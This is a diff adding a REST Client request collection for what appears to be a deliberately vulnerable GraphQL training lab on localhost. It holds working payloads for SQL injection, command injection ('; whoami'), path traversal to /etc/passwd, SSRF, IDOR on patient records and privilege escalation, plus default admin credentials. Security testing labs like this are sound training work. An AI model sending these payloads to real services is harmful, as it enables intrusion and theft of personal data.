@@ -1,0 +1,79 @@
+###
+# HTTP request collection for the VS Code REST Client extension
+# (https://marketplace.visualstudio.com/items?itemName=humao.rest-client).
+# Run `npm run lab` first, then click "Send Request" above any block.
+###
+
+@host = http://localhost:4000/graphql
+@adminToken = REPLACE_WITH_TOKEN_FROM_LOGIN
+
+### Health check
+GET http://localhost:4000/.well-known/apollo/server-health
+
+### Login (capture token from response and paste into @adminToken)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "mutation { login(username: \"admin\", password: \"admin123\") { token } }"}
+
+### Introspection
+POST {{host}}
+Content-Type: application/json
+
+{"query": "{ __schema { types { name } } }"}
+
+### List users with sensitive fields (A8)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "{ users { id username email role password ssn creditCard salary } }"}
+
+### BOLA / IDOR by patient id (A10)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "{ patient(id: \"1\") { name ssn medicalHistory } }"}
+
+### SQLi-style filter bypass (C1)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "{ searchPatients(query: \"' OR '1'='1\") { id name ssn } }"}
+
+### Command injection via ping (C2)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "{ ping(host: \"127.0.0.1; whoami\") { output error } }"}
+
+### Path traversal (C4)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "{ readFile(filename: \"../../../etc/passwd\") { content } }"}
+
+### SSRF via fetchExternalData (E1)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "{ fetchExternalData(url: \"http://127.0.0.1:4000/.well-known/apollo/server-health\") { statusCode body } }"}
+
+### Privilege escalation (B7)
+POST {{host}}
+Content-Type: application/json
+
+{"query": "mutation { promoteToAdmin(userId: \"4\", secretKey: \"admin_key_12345\") { id role } }"}
+
+### Assessment summary (admin)
+POST {{host}}
+Content-Type: application/json
+Authorization: Bearer {{adminToken}}
+
+{"query": "{ assessmentSummary { totalEvents criticalEvents highEvents mediumEvents lowEvents } }"}
+
+### Reset test data (admin)
+POST {{host}}
+Content-Type: application/json
+Authorization: Bearer {{adminToken}}
+
+{"query": "mutation { resetTestData(confirmPhrase: \"reset-test-data-confirmed\") }"}
